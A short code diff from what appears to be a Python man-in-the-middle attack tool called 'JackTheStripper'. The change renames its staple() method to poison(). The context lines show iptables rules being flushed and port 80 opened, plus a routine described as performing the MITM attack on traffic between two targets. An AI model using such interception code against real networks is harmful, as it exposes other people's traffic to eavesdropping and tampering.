@@ -16,7 +16,7 @@ class JackTheStripper():
 		self.setParams()
 		if self.blockWebBrowsing == 'y' or self.blockWebBrowsing == 'Y': self.block()
 		else: self.transpose()
-		self.staple()
+		self.poison()
 
 	def splash(self):
 		print "     ____.              __     ___________.__            "
@@ -131,7 +131,7 @@ class JackTheStripper():
 			subprocess.call(['iptables', '-F', 'INPUT'])
 			subprocess.call(['iptables', '-A', 'INPUT', '-p', 'tcp', '--dport', '80', '-j', 'ACCEPT'])
 
-	def staple(self):
+	def poison(self):
 		'Performs the MITM attack'
 		print 'Monitoring traffic between ' + self.target1 + ' and ' + self.target2 + ' using interface: '+ self.networkInterface + '.'
 		p = subprocess.Popen(['date', '+%Y%m%d_%H%M%S'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
